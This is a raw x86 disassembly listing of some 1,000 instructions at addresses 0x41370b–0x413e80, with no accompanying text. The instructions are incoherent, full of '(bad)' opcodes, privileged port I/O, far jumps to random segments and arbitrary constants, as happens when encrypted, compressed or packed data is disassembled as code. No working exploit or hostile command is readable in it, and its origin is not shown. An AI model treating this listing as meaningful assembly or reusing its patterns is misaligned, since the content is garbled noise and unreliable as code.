  41370b:	sub    DWORD PTR [ebx+0x50],esi
  41370e:	je     0x4136b1
  413710:	sahf   
  413711:	popa   
  413712:	xchg   dh,bl
  413714:	add    dl,BYTE PTR [edi]
  413716:	sbb    BYTE PTR [esi-0x1b],ch
  413719:	retf   
  41371a:	xchg   ecx,eax
  41371b:	sahf   
  41371c:	mov    esp,0xe8baf640
  413721:	popf   
  413722:	inc    edx
  413723:	nop
  413724:	loope  0x413718
  413726:	and    esi,DWORD PTR [edi]
  413728:	push   ebx
  413729:	stc    
  41372a:	pop    esi
  41372b:	outs   dx,DWORD PTR ds:[esi]
  41372c:	dec    ebx
  41372d:	pop    ecx
  41372e:	xor    esp,0x5d
  413731:	sar    BYTE PTR [eax+ecx*8-0x5f],cl
  413735:	arpl   WORD PTR [edx],si
  413737:	dec    edx
  413738:	dec    edi
  413739:	jb     0x413703
  41373b:	lea    ecx,[edi+0x48]
  41373e:	fdiv   QWORD PTR [edx]
  413740:	sti    
  413741:	ja     0x4137c0
  413743:	(bad)
  413746:	enter  0x5a7,0x8b
  41374a:	and    esp,esi
  41374c:	mov    ecx,0x2b222939
  413751:	mov    bh,0xa0
  413753:	imul   edx,DWORD PTR [edx],0xc32a7b73
  413759:	mov    ds:0x1feb5efa,al
  41375e:	test   al,0x9b
  413760:	jecxz  0x4137c6
  413762:	jge    0x413793
  413764:	int3   
  413765:	stos   DWORD PTR es:[edi],eax
  413766:	loopne 0x413751
  413768:	out    0xe9,eax
  41376a:	add    DWORD PTR [eax+0x9],ebx
  41376d:	aad    0xcc
  41376f:	scas   eax,DWORD PTR es:[edi]
  413770:	test   eax,0x7ecd60da
  413775:	and    eax,0xc6c4845e
  41377a:	pushf  
  41377b:	sti    
  41377c:	xchg   ecx,eax
  41377d:	inc    esi
  41377e:	(bad)  
  41377f:	cmp    DWORD PTR [edx-0x78862286],ecx
  413785:	xor    al,BYTE PTR [edi+0x7d]
  413788:	or     DWORD PTR [ebx+0x7c5496e9],edx
  41378e:	sbb    WORD PTR [eax-0x620d9b3d],dx
  413795:	mov    ah,0x7a
  413797:	sbb    ebx,edi
  413799:	push   esi
  41379a:	xor    al,0xd1
  41379c:	loop   0x41372b
  41379e:	je     0x4137b6
  4137a0:	push   edi
  4137a1:	and    eax,0x61e6925
  4137a6:	clc    
  4137a7:	add    eax,0x10fe9068
  4137ac:	(bad)  
  4137ad:	jmp    0x42bf:0xa178db1
  4137b4:	test   BYTE PTR ds:0x9ce23a22,ch
  4137ba:	outs   dx,DWORD PTR ds:[esi]
  4137bb:	pop    ebp
  4137bc:	loop   0x413778
  4137be:	retf   0x37ba
  4137c1:	leave  
  4137c2:	out    0x10,al
  4137c4:	stos   BYTE PTR es:[edi],al
  4137c5:	jg     0x413843
  4137c7:	pop    ebx
  4137c8:	ss inc edx
  4137ca:	xor    al,0x8d
  4137cc:	ror    BYTE PTR [edx+0x24],1
  4137cf:	or     eax,0x4890ff43
  4137d4:	test   eax,0xefebf1b1
  4137d9:	cmp    ah,ch
  4137db:	lds    eax,FWORD PTR [edx-0x52e3e1e6]
  4137e1:	inc    esi
  4137e2:	cmp    al,0xaf
  4137e4:	outs   dx,BYTE PTR ds:[esi]
  4137e5:	out    0xcf,al
  4137e7:	out    0x76,eax
  4137e9:	je     0x413823
  4137eb:	xchg   ecx,eax
  4137ec:	jb     0x413778
  4137ee:	mov    eax,ds:0xf66f2a87
  4137f3:	dec    ebp
  4137f4:	push   ebp
  4137f5:	jg     0x413804
  4137f7:	lock lods eax,DWORD PTR ds:[esi]
  4137f9:	data16 out 0xd0,al
  4137fc:	aaa    
  4137fd:	(bad)  
  4137ff:	das    
  413800:	sar    BYTE PTR [edi-0xd],1
  413803:	jl     0x413859
  413805:	inc    esp
  413806:	add    DWORD PTR [ebp-0x40],edi
  413809:	(bad)  
  41380a:	push   eax
  41380b:	rcr    BYTE PTR [ecx+0x37],cl
  41380e:	xchg   edi,eax
  41380f:	jp     0x413851
  413811:	and    DWORD PTR [edi],ebp
  413813:	mov    ?,esi
  413815:	fsubr  QWORD PTR [esi]
  413817:	das    
  413818:	retf   
  413819:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41381a:	inc    ebx
  41381b:	mov    bl,0x2f
  41381d:	inc    edi
  41381e:	sti    
  41381f:	jmp    0x87713781
  413824:	mov    ch,0xd6
  413826:	and    ebx,DWORD PTR [ecx-0x47910c09]
  41382c:	sub    al,0x67
  41382e:	mov    ds:0x7d72ac4e,al
  413833:	leave  
  413834:	stos   DWORD PTR es:[edi],eax
  413835:	sub    bl,BYTE PTR ds:0x963f5664
  41383b:	pop    ecx
  41383c:	(bad)  
  41383d:	or     eax,0x11c1cb6a
  413842:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413843:	test   eax,0x50fefc36
  413848:	push   ebx
  413849:	inc    edi
  41384a:	rcl    DWORD PTR ds:0x36a78446,cl
  413850:	mov    ch,0x57
  413852:	and    eax,0x6c32b5e6
  413857:	mov    cl,0x72
  413859:	fsubr  QWORD PTR [edi]
  41385b:	inc    eax
  41385c:	(bad)  
  41385d:	lods   eax,DWORD PTR ds:[esi]
  41385e:	out    dx,eax
  41385f:	test   al,0x57
  413861:	arpl   bp,ax
  413863:	ss push bx
  413866:	sbb    al,0x7c
  413868:	out    dx,al
  413869:	and    ch,BYTE PTR [ecx]
  41386b:	push   ss
  41386c:	shl    DWORD PTR [edi-0xe],0xb9
  413870:	mov    edi,ss
  413872:	push   eax
  413873:	cmp    dh,BYTE PTR [edi+0x7626fb2d]
  413879:	dec    ebx
  41387a:	cmp    BYTE PTR [ecx],0x6e
  41387d:	push   ebx
  41387e:	cmp    eax,0x818cd767
  413883:	add    BYTE PTR gs:[ebx+0x66],cl
  413887:	in     eax,dx
  413888:	icebp  
  413889:	cli    
  41388a:	ret    0xdcfd
  41388d:	ins    BYTE PTR es:[edi],dx
  41388e:	clc    
  41388f:	out    0xcf,eax
  413891:	pop    esp
  413892:	push   cs
  413893:	sub    ah,BYTE PTR [esi]
  413895:	xchg   edi,eax
  413896:	or     dh,ch
  413898:	pop    esp
  413899:	push   es
  41389a:	into   
  41389b:	pusha  
  41389c:	mov    ds:0xa5de0214,al
  4138a1:	rep ins DWORD PTR es:[edi],dx
  4138a3:	out    dx,al
  4138a4:	stos   DWORD PTR es:[edi],eax
  4138a5:	idiv   DWORD PTR [ecx]
  4138a7:	ins    DWORD PTR es:[edi],dx
  4138a8:	stos   BYTE PTR es:[edi],al
  4138a9:	push   edx
  4138aa:	movlps QWORD PTR [esi+0x3c],xmm5
  4138ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138af:	aas    
  4138b0:	cwde   
  4138b1:	test   al,0x76
  4138b3:	(bad)  
  4138b4:	out    0x8a,eax
  4138b6:	or     esi,esp
  4138b8:	outs   dx,BYTE PTR ds:[esi]
  4138b9:	dec    edi
  4138ba:	aaa    
  4138bb:	xchg   esi,eax
  4138bc:	adc    eax,0xe418ec5c
  4138c1:	not    ecx
  4138c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138c4:	cmp    eax,0xf8734a72
  4138c9:	jno    0x413895
  4138cb:	or     al,0xbc
  4138cd:	cmp    BYTE PTR [ebx],ch
  4138cf:	push   esp
  4138d0:	ja     0x413918
  4138d2:	ret    
  4138d3:	fdiv   st,st(2)
  4138d5:	popa   
  4138d6:	add    ecx,DWORD PTR [ecx+eiz*1-0x24]
  4138da:	aas    
  4138db:	mov    dl,0x8
  4138dd:	sub    DWORD PTR [eax+0xa7bd35],esp
  4138e3:	outs   dx,DWORD PTR ds:[esi]
  4138e4:	add    DWORD PTR [esi-0x4edcf4c8],eax
  4138ea:	or     dl,0x61
  4138ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138ee:	in     eax,0xb0
  4138f0:	(bad)  
  4138f1:	std    
  4138f2:	mov    eax,ds:0x4db61b73
  4138f7:	xchg   edx,eax
  4138f8:	cld    
  4138f9:	lods   eax,DWORD PTR ds:[esi]
  4138fa:	out    dx,al
  4138fb:	mov    dh,0xe6
  4138fd:	pop    edi
  4138fe:	out    dx,eax
  4138ff:	aam    0xb9
  413901:	repnz mov edx,0xd6deec40
  413907:	lods   al,BYTE PTR ds:[esi]
  413908:	xchg   edi,eax
  413909:	in     eax,0x7d
  41390b:	lods   al,BYTE PTR ds:[esi]
  41390c:	enter  0x2345,0x30
  413910:	dec    ebx
  413911:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413912:	daa    
  413913:	cmp    DWORD PTR [ebp-0x47],edx
  413916:	or     eax,0x3c4304ec
  41391b:	mov    cl,0x11
  41391d:	out    0x62,eax
  41391f:	outs   dx,DWORD PTR ds:[esi]
  413920:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413921:	mov    ebp,0x5fb9b466
  413926:	fistp  DWORD PTR [eax]
  413928:	ret    0xda9
  41392b:	ds repz aam 0x8d
  41392f:	leave  
  413930:	cmp    DWORD PTR [edi],ecx
  413932:	retf   0xdeab
  413935:	lods   al,BYTE PTR ds:[esi]
  413936:	push   ebp
  413937:	mov    bl,0x75
  413939:	int    0x1a
  41393b:	pop    ebp
  41393c:	fs or  ebx,esi
  41393f:	jne    0x413962
  413941:	lea    esp,[eax+0x3e7bafb6]
  413947:	shl    DWORD PTR [ebp+0x3098b154],0x1b
  41394e:	fild   QWORD PTR [ebp+0x1a9ae331]
  413954:	test   al,0xa3
  413956:	jge    0x413978
  413958:	and    eax,0xd1ec7baa
  41395d:	mov    ch,BYTE PTR [ebp+0x61]
  413960:	iret   
  413961:	push   0x23
  413963:	cmp    dl,BYTE PTR [edx+0x21]
  413966:	pop    eax
  413967:	jmp    0x1b1c:0x62b578a0
  41396e:	retf   0xeeee
  413971:	ret    
  413972:	and    edx,DWORD PTR [ecx-0x6c7fce7a]
  413978:	and    ebx,DWORD PTR [edi-0x5f]
  41397b:	sbb    eax,0xcc82c942
  413980:	jae    0x41398a
  413982:	pop    ebx
  413983:	arpl   WORD PTR [edx],bp
  413985:	aaa    
  413986:	pop    edi
  413987:	or     eax,0x152fe35a
  41398c:	mov    DWORD PTR ds:[ecx],esi
  41398f:	mov    ecx,0xf981ffb1
  413994:	cld    
  413995:	add    ebp,DWORD PTR [ecx+0x25986c80]
  41399b:	in     al,0x32
  41399d:	mov    eax,0x261163fa
  4139a2:	dec    edx
  4139a3:	xor    bh,BYTE PTR [ecx+0x5706bf22]
  4139a9:	aaa    
  4139aa:	cwde   
  4139ab:	jbe    0x4139c3
  4139ad:	push   esp
  4139ae:	icebp  
  4139af:	lea    ecx,[ebp-0x49]
  4139b2:	xor    eax,0x2a87bce0
  4139b7:	inc    ebx
  4139b8:	cmp    al,0xdd
  4139ba:	inc    ecx
  4139bb:	add    eax,0x4dfe3e28
  4139c0:	push   ebx
  4139c1:	push   es
  4139c2:	pusha  
  4139c3:	mov    ebp,0x243ae779
  4139c8:	ficom  DWORD PTR [eax]
  4139ca:	dec    ecx
  4139cb:	adc    bh,BYTE PTR [ecx+esi*4]
  4139ce:	jg     0x4139ae
  4139d0:	shr    DWORD PTR [ebx-0x20b3d95],1
  4139d6:	popf   
  4139d7:	jb     0x4139ec
  4139d9:	mov    ds:0x458ad4a5,al
  4139de:	jl     0x413970
  4139e0:	pop    esp
  4139e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139e2:	sbb    DWORD PTR [ebx],eax
  4139e4:	neg    DWORD PTR ds:0x59004eed
  4139ea:	push   ebp
  4139eb:	out    dx,al
  4139ec:	inc    esi
  4139ed:	pop    ds
  4139ee:	test   esi,ecx
  4139f0:	sbb    al,0xff
  4139f2:	jmp    0x413a65
  4139f4:	(bad)  
  4139f5:	mov    ds:0xa6459e38,al
  4139fa:	ret    0x1650
  4139fd:	rep ins DWORD PTR es:[edi],dx
  4139ff:	jmp    0xd19e522a
  413a04:	sub    ebx,esi
  413a06:	loop   0x4139ed
  413a08:	loope  0x413a19
  413a0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a0b:	xchg   esp,eax
  413a0c:	xlat   BYTE PTR ds:[ebx]
  413a0d:	xchg   ebp,eax
  413a0e:	(bad)  
  413a0f:	rcr    BYTE PTR [edi+0x1d],1
  413a12:	mul    cl
  413a14:	dec    ecx
  413a15:	mov    edx,0xad583f8e
  413a1a:	std    
  413a1b:	mov    esp,DWORD PTR gs:[eax]
  413a1e:	mov    dl,0x4b
  413a20:	fdivp  st(5),st
  413a22:	jl     0x413a91
  413a24:	fnstcw WORD PTR [eax]
  413a26:	ret    0x58de
  413a29:	stc    
  413a2a:	sbb    ch,BYTE PTR ds:[edi+0x3b]
  413a2e:	aaa    
  413a2f:	dec    ebp
  413a30:	sbb    DWORD PTR [eax+0x33f45d06],ebx
  413a36:	xchg   esi,eax
  413a37:	(bad)  
  413a38:	(bad)  
  413a39:	sbb    al,0x92
  413a3b:	cld    
  413a3c:	(bad)  
  413a3d:	jl     0x413aa1
  413a3f:	xchg   ecx,eax
  413a40:	sbb    BYTE PTR [ebx-0x3a69aca0],0x22
  413a47:	nop
  413a48:	dec    edx
  413a49:	outs   dx,DWORD PTR ds:[esi]
  413a4a:	out    dx,eax
  413a4b:	mov    ds:0x15c5cf67,eax
  413a50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a51:	call   0x424d:0xaabfcfe4
  413a58:	lock or BYTE PTR [ebx],bh
  413a5b:	push   ecx
  413a5c:	mov    eax,0xed23bbc7
  413a61:	loop   0x413ab5
  413a63:	pop    es
  413a64:	sub    DWORD PTR [ecx],eax
  413a66:	(bad)  
  413a67:	stos   DWORD PTR es:[edi],eax
  413a68:	inc    ecx
  413a69:	retf   
  413a6a:	loopne 0x413a79
  413a6c:	push   es
  413a6d:	and    bl,BYTE PTR cs:[esi-0x70]
  413a71:	sbb    ecx,DWORD PTR [ebx-0x227bebf3]
  413a77:	xor    al,0x70
  413a79:	pop    edi
  413a7a:	xlat   BYTE PTR ds:[ebx]
  413a7b:	jns    0x413aa5
  413a7d:	or     edx,ecx
  413a7f:	sub    edi,DWORD PTR [ecx-0x32c69026]
  413a85:	shr    al,cl
  413a87:	into   
  413a88:	sbb    bh,ah
  413a8a:	xchg   ecx,eax
  413a8b:	cld    
  413a8c:	cmp    ch,BYTE PTR [eax-0x245f76e4]
  413a92:	mov    al,ds:0xa8d8d732
  413a97:	add    BYTE PTR [ebx-0x59],dh
  413a9a:	jmp    0xf720bcc4
  413a9f:	or     dl,BYTE PTR [esi]
  413aa1:	adc    DWORD PTR [edx*8-0x32dc9fae],edx
  413aa8:	mov    edi,0x83c72b47
  413aad:	out    dx,al
  413aae:	fnstsw WORD PTR [edi]
  413ab0:	inc    ecx
  413ab1:	or     esp,edi
  413ab3:	xor    al,0xb0
  413ab5:	call   0xf59d11e6
  413aba:	ja     0x413a96
  413abc:	mov    BYTE PTR [ebp+edx*1-0x46fd662a],0xa0
  413ac4:	adc    ch,BYTE PTR [edi]
  413ac6:	sub    al,BYTE PTR [eax]
  413ac8:	sti    
  413ac9:	xchg   esi,eax
  413aca:	xchg   DWORD PTR [edi-0xc],ebx
  413acd:	adc    al,0xf
  413acf:	aad    0x6a
  413ad1:	push   edx
  413ad2:	sahf   
  413ad3:	mov    edx,0xd5f99f72
  413ad8:	daa    
  413ad9:	and    BYTE PTR [ecx],0x67
  413adc:	aaa    
  413add:	sub    DWORD PTR [edi+0x3c],ebx
  413ae0:	jecxz  0x413a72
  413ae2:	xchg   esi,eax
  413ae3:	ss pop eax
  413ae5:	and    al,0x12
  413ae7:	push   ecx
  413ae8:	and    DWORD PTR [edx+0x7],ecx
  413aeb:	xor    eax,0xdda66f70
  413af0:	fucomp st(6)
  413af2:	(bad)  
  413af3:	in     al,0xc3
  413af5:	dec    ebx
  413af6:	in     al,0x68
  413af8:	arpl   WORD PTR [ebx+0x68b915b7],di
  413afe:	mov    ds:0x9628459a,al
  413b03:	and    ebp,DWORD PTR ds:0x1c9c6280
  413b09:	in     eax,0xf4
  413b0b:	or     bh,BYTE PTR [eax+ecx*4-0x46963a0c]
  413b12:	aaa    
  413b13:	jns    0x413afa
  413b15:	mov    edi,0x218079f7
  413b1a:	inc    ebx
  413b1b:	xchg   esi,eax
  413b1c:	cmc    
  413b1d:	pushf  
  413b1e:	sub    DWORD PTR [esi+0x5e],eax
  413b21:	scas   al,BYTE PTR es:[edi]
  413b22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b23:	icebp  
  413b24:	mov    cl,0x9f
  413b26:	mov    esi,0x6bf1e730
  413b2b:	add    DWORD PTR [edx-0x63],ebx
  413b2e:	std    
  413b2f:	scas   al,BYTE PTR es:[edi]
  413b30:	mov    edx,0x7788e740
  413b35:	mov    es,eax
  413b37:	ss cld 
  413b39:	out    dx,eax
  413b3a:	pop    ss
  413b3b:	cmc    
  413b3c:	arpl   sp,sp
  413b3e:	dec    edx
  413b3f:	push   ds
  413b40:	inc    edx
  413b41:	cs (bad) 
  413b43:	push   ss
  413b44:	xchg   edi,eax
  413b45:	int3   
  413b46:	or     al,0x47
  413b48:	pusha  
  413b49:	cmc    
  413b4a:	mov    cl,0x34
  413b4c:	outs   dx,DWORD PTR ds:[esi]
  413b4d:	test   DWORD PTR [eax-0x3e89b9e5],edx
  413b53:	cmc    
  413b54:	inc    edx
  413b55:	jns    0x413b77
  413b57:	es lahf 
  413b59:	push   ds
  413b5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b5b:	cmp    dh,BYTE PTR [ecx+0x92df76]
  413b61:	or     BYTE PTR [edx*4+0x3f3309e8],0xfa
  413b69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b6a:	ins    DWORD PTR es:[edi],dx
  413b6b:	(bad)  [edx+0x72746142]
  413b71:	dec    ebp
  413b72:	cmp    bh,dl
  413b74:	sbb    eax,DWORD PTR [ebx]
  413b76:	or     ebp,DWORD PTR [eax-0xe4ac292]
  413b7c:	iret   
  413b7d:	mov    ecx,0x9dbf8feb
  413b82:	out    dx,eax
  413b83:	ror    DWORD PTR [eax],0xa2
  413b86:	dec    esi
  413b87:	cmp    eax,0x44c91919
  413b8c:	sub    esi,ecx
  413b8e:	jne    0x413bf4
  413b90:	sbb    DWORD PTR ds:0xec86272b,0xf7db269e
  413b9a:	jle    0x413bfa
  413b9c:	lods   al,BYTE PTR ds:[esi]
  413b9d:	dec    ebp
  413b9e:	div    BYTE PTR [edi]
  413ba0:	inc    ecx
  413ba1:	in     eax,0x65
  413ba3:	aas    
  413ba4:	xchg   esi,eax
  413ba5:	pop    eax
  413ba6:	int3   
  413ba7:	cmp    bl,dh
  413ba9:	call   0x52ca8e43
  413bae:	mov    bh,0xcf
  413bb0:	pop    ecx
  413bb1:	xchg   ecx,eax
  413bb2:	ins    BYTE PTR es:[edi],dx
  413bb3:	push   ebp
  413bb4:	push   di
  413bb6:	mov    cl,0xd6
  413bb8:	mov    bl,0x6e
  413bba:	adc    dl,BYTE PTR [edi+0x50]
  413bbd:	sbb    dl,BYTE PTR [edi+0x38f8bbbb]
  413bc3:	and    al,0xe8
  413bc5:	add    DWORD PTR [edi+0x7c],eax
  413bc8:	cwde   
  413bc9:	popa   
  413bca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bcb:	push   esp
  413bcc:	hlt    
  413bcd:	ds js  0x413b9a
  413bd0:	mov    edx,0x752182a2
  413bd5:	or     dh,BYTE PTR [ecx]
  413bd7:	jno    0x413c0d
  413bd9:	in     eax,0x5
  413bdb:	repnz dec edi
  413bdd:	dec    edi
  413bde:	mov    ah,0x8c
  413be0:	enter  0x75f3,0x52
  413be4:	or     eax,0xec51ae04
  413be9:	lods   eax,DWORD PTR ds:[esi]
  413bea:	in     al,0xa9
  413bec:	ds pop edi
  413bee:	data16 mov ah,dl
  413bf1:	stos   BYTE PTR es:[edi],al
  413bf2:	in     eax,0x1
  413bf4:	push   ecx
  413bf5:	and    BYTE PTR [ecx-0x35],0xe6
  413bf9:	retf   0x26e3
  413bfc:	xchg   edi,eax
  413bfd:	mov    esi,0x53b7cf5e
  413c02:	mov    WORD PTR [edi+0x1],fs
  413c05:	loope  0x413c0a
  413c07:	push   ebx
  413c08:	dec    ebp
  413c09:	push   esp
  413c0a:	xchg   esi,eax
  413c0b:	jmp    0x413c15
  413c0d:	shl    DWORD PTR [ebx],0x1b
  413c10:	out    dx,al
  413c11:	(bad)  
  413c12:	lock and BYTE PTR [edi+0x4f8c1d17],cl
  413c19:	mov    ebp,0xa4013971
  413c1e:	mov    ebx,0x7cd35d28
  413c23:	cwde   
  413c24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c25:	fldenv [ebp+ebx*1-0x17]
  413c29:	mov    al,ds:0x7932ae83
  413c2e:	dec    edx
  413c2f:	jl     0x413bdc
  413c31:	xchg   ah,dh
  413c33:	call   0x6135:0x32c20e2e
  413c3a:	mov    WORD PTR [edx],ss
  413c3c:	push   cs
  413c3d:	iret   
  413c3e:	add    al,BYTE PTR [edx-0x10]
  413c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c42:	fild   QWORD PTR ds:[esi+0x0]
  413c46:	ret    
  413c47:	out    0xc9,eax
  413c49:	mov    ebp,0x384af05
  413c4e:	dec    ebx
  413c4f:	dec    esi
  413c50:	jg     0x413c9b
  413c52:	mov    bl,BYTE PTR [ecx-0x6f10f25e]
  413c58:	loop   0x413cc3
  413c5a:	and    dl,BYTE PTR [ebx]
  413c5c:	add    BYTE PTR [ecx],cl
  413c5e:	lahf   
  413c5f:	nop
  413c60:	inc    ebx
  413c61:	out    dx,eax
  413c62:	mov    esp,0xf57abec9
  413c67:	mov    BYTE PTR [ebp-0x6444d319],bl
  413c6d:	jbe    0x413cb1
  413c6f:	xchg   esp,eax
  413c70:	cmp    eax,0xc483fb28
  413c75:	push   0x3e
  413c77:	mov    BYTE PTR [ecx-0x37],bl
  413c7a:	push   cs
  413c7b:	inc    ebp
  413c7c:	gs sbb eax,0x32c094c6
  413c82:	xor    DWORD PTR [edi+edi*8-0x28],0x16
  413c87:	fisubr WORD PTR [esi-0x1e2ee34e]
  413c8d:	push   eax
  413c8e:	push   ebp
  413c8f:	mov    WORD PTR [edi+ecx*4],?
  413c92:	pop    ebp
  413c93:	cmp    DWORD PTR [edi+ebp*8],eax
  413c96:	pop    ecx
  413c97:	cmp    BYTE PTR [esi+0x4b470b69],ah
  413c9d:	mov    edx,0x625ea662
  413ca2:	les    esi,FWORD PTR [edi]
  413ca4:	cmp    edi,esp
  413ca6:	jbe    0x413c88
  413ca8:	out    0x98,al
  413caa:	cmp    bh,BYTE PTR [ecx]
  413cac:	add    ecx,DWORD PTR [ecx+0x1f]
  413caf:	popa   
  413cb0:	fisubr WORD PTR [eax+0x3a]
  413cb3:	cld    
  413cb4:	shl    DWORD PTR [edi],cl
  413cb6:	cmp    al,bl
  413cb8:	sub    ch,bl
  413cba:	xchg   edi,esp
  413cbc:	ficom  WORD PTR [esp+edx*4]
  413cbf:	or     eax,0xef7dfea1
  413cc4:	int3   
  413cc5:	dec    ebx
  413cc6:	das    
  413cc7:	cwde   
  413cc8:	lock (bad) 
  413cca:	icebp  
  413ccb:	int    0xcc
  413ccd:	movaps xmm4,XMMWORD PTR [edi+0x7e25914b]
  413cd4:	(bad)  
  413cd5:	or     al,0x9b
  413cd7:	int    0x5b
  413cd9:	xchg   ebp,eax
  413cda:	push   ebx
  413cdb:	les    ebp,FWORD PTR [ebp+0x57bc1977]
  413ce1:	call   0x20b:0xdeac2502
  413ce8:	mov    eax,0xf45d9c61
  413ced:	lea    ecx,[ebp+0xf]
  413cf0:	js     0x413d30
  413cf2:	(bad)  
  413cf3:	call   0x48a0:0xc5d7dde5
  413cfa:	sahf   
  413cfb:	jae    0x413d1a
  413cfd:	mov    ecx,0x9a3515f5
  413d02:	(bad)  
  413d04:	dec    edi
  413d05:	mov    bh,0x67
  413d07:	add    ebp,ecx
  413d09:	ins    DWORD PTR es:[edi],dx
  413d0a:	xor    bx,WORD PTR [edi]
  413d0d:	rol    BYTE PTR [edx-0x3a],cl
  413d10:	lock adc al,0x94
  413d13:	leave  
  413d14:	(bad)  
  413d15:	sub    bl,BYTE PTR [ebx]
  413d17:	xchg   esp,eax
  413d18:	out    0x20,al
  413d1a:	xor    eax,0x8cfbcc03
  413d1f:	xor    esi,DWORD PTR [ebp-0x11]
  413d22:	js     0x413d38
  413d24:	sub    al,0x4a
  413d26:	and    al,BYTE PTR [esi+0x4a]
  413d29:	mov    eax,ds:0x6e0e330a
  413d2e:	jb     0x413d7a
  413d30:	pop    ebp
  413d31:	in     al,dx
  413d32:	(bad)  
  413d33:	pusha  
  413d34:	sbb    eax,0x587bc148
  413d39:	ret    0x86ff
  413d3c:	movhps QWORD PTR [esi],xmm5
  413d3f:	je     0x413d8c
  413d41:	fs mov dh,0x44
  413d44:	or     al,0x34
  413d46:	sbb    esp,eax
  413d48:	push   edx
  413d49:	mov    edx,0x15b02b73
  413d4e:	in     eax,dx
  413d4f:	jmp    0x63f92aa8
  413d54:	mov    esp,DWORD PTR ds:0x41ef9b67
  413d5a:	in     eax,dx
  413d5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d5c:	sbb    BYTE PTR [esp+eax*1-0x4c820f71],dh
  413d63:	adc    ch,bh
  413d65:	or     BYTE PTR [ecx],ah
  413d67:	push   ebx
  413d68:	gs inc ebx
  413d6a:	sbb    BYTE PTR [edi],dl
  413d6c:	push   esp
  413d6d:	jns    0x413d73
  413d6f:	test   eax,ebp
  413d71:	xchg   edx,eax
  413d72:	cli    
  413d73:	mov    dl,0x47
  413d75:	xor    eax,0xb11372bd
  413d7a:	jp     0x413d99
  413d7c:	je     0x413d1d
  413d7e:	repnz sub BYTE PTR [edi+ebp*2+0x2584919f],dh
  413d86:	xchg   ecx,ecx
  413d88:	dec    esp
  413d89:	lahf   
  413d8a:	push   edi
  413d8b:	aam    0x8e
  413d8d:	pop    ss
  413d8e:	xchg   esi,eax
  413d8f:	adc    eax,0x731cd40d
  413d94:	push   cs
  413d95:	out    0xa,eax
  413d97:	jmp    0x413d8d
  413d99:	jo     0x413d9f
  413d9b:	ins    DWORD PTR es:[edi],dx
  413d9c:	lock and al,0x56
  413d9f:	mov    DWORD PTR [ebp-0x7b105ab9],0x88f4fefe
  413da9:	fcmovnu st,st(6)
  413dab:	sub    al,0xba
  413dad:	pop    ds
  413dae:	scas   al,BYTE PTR es:[edi]
  413daf:	cmp    esp,DWORD PTR [ecx+0x5e635420]
  413db5:	les    edx,FWORD PTR [esi-0xb8712ec]
  413dbb:	cmc    
  413dbc:	ins    DWORD PTR es:[edi],dx
  413dbd:	push   ecx
  413dbe:	xchg   ecx,eax
  413dbf:	mov    eax,ds:0x486e0478
  413dc4:	jp     0x413e45
  413dc6:	ror    esi,0x31
  413dc9:	and    eax,0x88999053
  413dce:	sbb    BYTE PTR [eax-0x4c6c44e1],al
  413dd4:	dec    ebx
  413dd5:	test   al,0x93
  413dd7:	popf   
  413dd8:	or     al,0x91
  413dda:	xor    ch,BYTE PTR [edx+esi*1]
  413ddd:	(bad)  
  413dde:	cwde   
  413ddf:	push   esi
  413de0:	add    ebx,DWORD PTR [ebx+eiz*2]
  413de3:	es mov dl,0xb3
  413de6:	jmp    0xae6b:0x4c6f7dde
  413ded:	aad    0xe1
  413def:	ret    0xf15b
  413df2:	cli    
  413df3:	add    dh,BYTE PTR [ecx+0x27]
  413df6:	push   ss
  413df7:	jbe    0x413da4
  413df9:	sbb    BYTE PTR [ecx+0x33],ah
  413dfc:	js     0x413df9
  413dfe:	push   ss
  413dff:	test   eax,0x2c30202e
  413e04:	pop    ss
  413e05:	das    
  413e06:	fs out 0xcf,al
  413e09:	ds scas al,BYTE PTR es:[edi]
  413e0b:	test   BYTE PTR [ecx],dl
  413e0d:	sbb    eax,0xbc1b94b0
  413e12:	cmp    eax,esi
  413e14:	jp     0x413df7
  413e16:	rcr    al,0x22
  413e19:	fdivr  DWORD PTR [ecx-0x71112ec7]
  413e1f:	sub    dh,al
  413e21:	aaa    
  413e22:	das    
  413e23:	icebp  
  413e24:	ret    
  413e25:	sub    eax,0x65f7d68
  413e2a:	bnd jo 0x413e6d
  413e2d:	sbb    al,dl
  413e2f:	lea    ebp,[ebx]
  413e31:	inc    edx
  413e32:	jno    0x413dec
  413e34:	jb     0x413e7f
  413e36:	sti    
  413e37:	sbb    DWORD PTR [edi],ebx
  413e39:	js     0x413e45
  413e3b:	aaa    
  413e3c:	xor    eax,0xa8d8b378
  413e41:	stos   DWORD PTR es:[edi],eax
  413e42:	sub    dh,BYTE PTR [edx+0x11932459]
  413e48:	in     eax,dx
  413e49:	ja     0x413e09
  413e4b:	inc    ebx
  413e4c:	ja     0x413e4f
  413e4e:	sar    BYTE PTR [edx],0xcc
  413e51:	or     esp,DWORD PTR [esi-0x2]
  413e54:	sbb    edi,DWORD PTR [edx-0x326e2f78]
  413e5a:	xor    ch,dh
  413e5c:	or     esi,edx
  413e5e:	aas    
  413e5f:	call   0x40dba52c
  413e64:	ud2    
  413e66:	push   0xa521ac9e
  413e6b:	frstor [ebx]
  413e6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e6e:	lock xor BYTE PTR [ecx+0x2c],ch
  413e72:	dec    esi
  413e73:	hlt    
  413e74:	add    BYTE PTR [edi],al
  413e76:	in     al,0x9e
  413e78:	sahf   
  413e79:	sub    BYTE PTR [ebp-0x67e7ae2b],bl
  413e7f:	(bad)  
  413e80:	push   DWORD PTR [ebx+0xbc03d3b]
